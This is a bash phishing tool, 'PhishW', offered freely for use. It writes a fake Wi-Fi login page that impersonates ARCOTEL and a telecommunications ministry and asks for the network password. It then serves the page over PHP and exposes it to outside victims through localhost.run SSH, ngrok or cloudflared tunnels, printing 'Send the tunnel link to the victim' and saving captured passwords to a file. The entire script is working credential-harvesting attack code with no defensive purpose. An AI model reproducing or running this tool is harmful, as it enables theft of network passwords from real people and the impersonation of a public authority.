#! /bin/bash

#--->PHISHW
#Code-updated
#free-code
#Give-credits-to-@Demo593

clear
setterm -foreground green
figlet PhishW
echo ""
echo "=================Phishing================"
echo ""
setterm -foreground blue
echo -n "[+]Enter the name of the Wi-Fi network >> "
read a
echo "
<!DOCTYPE html>
<html lang='es'>
<head>
  <meta charset='UTF-8'>
  <meta name='viewport' content='width=device-width, initial-scale=1.0'>
  <meta http-equiv='X-UA-Compatible' content='ie=edge'>
  <title>Wi-Fi $a</title>
  <link rel='stylesheet' href='style.css'>
  <link rel='icon' type='image/x-icon' href='favicon.ico'>
  <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css'/>
</head>
<body>
 <div class='background'></div>
  <div class='wrapper'>
    <section class='form signup'>
      <header><FONT COLOR='gray'>$a</FONT><img src='D.png' width='43px' height='35px'></header>
      <form action='login.php'  method='POST'>
        <div class='field input'>
          <label>Contraseña</label>
          <input type='password' name='Clave' placeholder='enter password' required>
          <i class='fas fa-eye'></i>
        </div>
        <div class='SubmitBtn'>
          <center><input class='submitBtn' type='submit'  value='Connect'></center>
        </div>
      </form>
      <div class='link'>ARCOTEL S.A.<a href='login.php'</a></div>
      <center><h8><FONT COLOR='gray'>Ministry of Telecommunications</FONT></h8></center>
    </section>
  </div>

  <script src='pass-show-hide.js'></script>
</body>
</html>
" > index.html

sleep 1
echo -n "[+]Write a port default.[4444] >> "
read b
sleep 1
echo ""
while :
do
#MENU
#ESCOJER MENU
setterm -foreground green
echo "-----------------------------"
echo "| [1]. Set up php server  |"
echo "| [2]. Exit               |"
echo -n "OPTION >> "
read option
case $option in
1)
#! /bin/bash
setterm -foreground yellow
echo ""
echo "========================================="
echo "The Password is saved in the txt file"
echo "========================================="
while :
do
echo ""
setterm -foreground white
echo -e "\e[1;31ma\e[0m\e[1;34m)\e[0m\e[1;37mTunnel SSH\e[0m     \e[1;31mb\e[0m\e[1;34m)\e[0m\e[1;37mAutomatic Ngrok\e[0m    \e[1;31mc\e[0m\e[1;34m)\e[0m\e[1;37mCloudflared Tunnel\e[0m"
echo ""
setterm -foreground blue
echo -n "[+]PhishW >> "
read wifi
case $wifi in
a)
#! /bin/bash
echo ""
setterm -foreground cyan
echo "========================================="
echo "Send the tunnel link to the victim"
echo "========================================="
echo ""
php -S 0.0.0.0:$b & ssh -R 80:localhost:$b nokey@localhost.run -q -y
exit
;;
b)
echo ""
#! /bin/bash
setterm -foreground yellow
echo "[><] Loading Ngrok link ...."
sleep 3
echo ""
php -S 0.0.0.0:$b & ngrok http $b
exit
;;
c)
echo ""
#! /bin/bash
setterm -foreground yellow
echo "[><] Charging Cloudflared ...."
sleep 3
echo ""
setterm -foreground white
clear
php -S 0.0.0.0:$b & cloudflared -url localhost:$b
exit
;;
esac
done
;;
2)
echo ""
#! /bin/bash
setterm -foreground cyan
echo "Bye !!"
exit
;;
esac 
done 
#
